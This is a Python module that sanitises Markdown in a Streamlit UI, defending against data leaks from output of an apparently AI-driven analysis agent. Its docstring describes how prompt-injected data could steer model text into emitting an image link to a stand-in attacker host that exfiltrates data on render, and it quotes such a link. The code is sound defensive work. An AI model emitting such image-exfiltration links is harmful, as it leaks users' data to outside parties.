"""Markdown hygiene for the Streamlit UI (no Streamlit import, so tests can load it).

Much of what the UI shows is untrusted: tool output summaries are raw dataset values, and plans,
critic issues, key-number names and the report are model text that prompt-injected data can
steer. A Markdown image is fetched by the viewer's browser as soon as it renders, so
``![x](https://attacker/?q=<data>)`` would leak data without a click (review M2).

- Text passed to ``st.markdown`` / ``st.error`` / widget labels goes through :func:`safe_md`,
  which makes every image (inline, reference-style or nested) inert. Links still need a click.
- The step timeline is HTML-escaped instead (``ui_helpers.step_html``).
- Report charts are shown only via :func:`report_parts`: an image reference becomes a chart
  only when its URL is one of the job's own ``/artifacts/...`` entries, which the UI fetches
  server-side. Any other image URL is shown as inert text, never fetched.
"""

from __future__ import annotations

import re
from collections.abc import Iterable

from ui_helpers import split_report

# What the API's /artifacts route serves: a relative path of plain segments, no query string.
_ARTIFACT_URL = re.compile(r"^/artifacts/(?:[A-Za-z0-9_.-]+/)*[A-Za-z0-9_-][A-Za-z0-9_.-]*$")


def safe_md(text: object) -> str:
    """Markdown with every image (inline, reference-style or nested) turned into plain text."""
    return str(text).replace("![", "!\\[")


def code_span(text: object) -> str:
    """Untrusted text as an inline code span (backticks in the text cannot close it)."""
    return "`" + str(text).replace("`", "'") + "`"


def is_artifact_url(url: str, allowed: Iterable[str]) -> bool:
    """True only for one of this job's artifact URLs (``/artifacts/<path>``, no ``..``)."""
    return url in set(allowed) and bool(_ARTIFACT_URL.match(url)) and ".." not in url


def report_parts(markdown: str, artifact_urls: Iterable[str]) -> list[tuple[str, str, str]]:
    """``[("md", safe markdown, ""), ("chart", artifact url, caption), ...]`` in order.

    Image references to the job's own artifacts become ``chart`` parts (fetched server-side by
    the caller); every other image, including reference-style ones, stays inert text.
    """
    allowed = set(artifact_urls)
    out: list[tuple[str, str, str]] = []
    for kind, value, alt in split_report(markdown):
        if kind == "img" and is_artifact_url(value, allowed):
            out.append(("chart", value, safe_md(alt)))
        elif kind == "img":
            out.append(("md", f"*[image not shown: {code_span(value)}]*", ""))
        else:
            out.append(("md", safe_md(value), ""))
    return out
